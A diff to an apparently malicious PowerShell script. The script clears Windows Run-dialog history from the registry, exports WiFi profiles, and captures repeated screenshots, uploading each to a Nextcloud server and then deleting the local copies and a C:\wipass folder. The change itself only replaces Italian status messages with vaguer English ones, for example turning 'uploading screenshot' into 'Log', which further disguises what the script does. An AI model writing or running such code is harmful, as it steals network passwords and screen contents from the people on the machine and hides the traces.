@@ -19,7 +19,7 @@ function Nextcloud-Upload {
 
 try {
     # 1. Pulizia iniziale record (Registry)
-    Write-Host "Pulizia tracce MRU..." -ForegroundColor Gray
+    Write-Host "Clean MRU..." -ForegroundColor Gray
     Remove-Item "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\*" -ErrorAction SilentlyContinue
 
     # 2. Export WiFi
@@ -35,7 +35,7 @@ try {
     }
 
     if (Test-Path "$env:computername-wificapture.txt") {
-        Write-Host "Caricamento report WiFi..." -ForegroundColor Cyan
+        Write-Host "Report WiFi..." -ForegroundColor Cyan
         "$env:computername-wificapture.txt" | Nextcloud-Upload
     }
 
@@ -60,7 +60,7 @@ try {
         $bmp.Dispose()
       
         if (Test-Path $currentPath) {
-            Write-Host "Caricamento Screenshot $i..." -ForegroundColor Cyan
+            Write-Host "Log $i..." -ForegroundColor Cyan
             $currentPath | Nextcloud-Upload
             # Eliminazione immediata dopo l'upload per non accumulare file
             Remove-Item $currentPath -Force
@@ -97,5 +97,5 @@ finally {
         Remove-Item "C:\wipass" -Force -Recurse -ErrorAction SilentlyContinue
     }
 
-    Write-Host "Pulizia completata." -ForegroundColor Green
+    Write-Host "Finished" -ForegroundColor Green
 }
